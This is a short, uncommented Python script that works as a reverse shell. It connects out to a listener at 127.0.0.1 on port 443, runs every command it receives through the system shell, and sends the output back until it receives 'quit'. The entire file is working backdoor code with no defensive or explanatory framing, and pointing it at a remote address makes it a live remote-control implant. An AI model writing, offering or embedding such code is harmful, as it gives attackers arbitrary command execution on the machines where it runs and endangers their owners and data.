import socket
import subprocess
import os

HOST = '127.0.0.1'
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
while 1:
    data = s.recv(4096)
    if data == 'quit':
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)
s.close()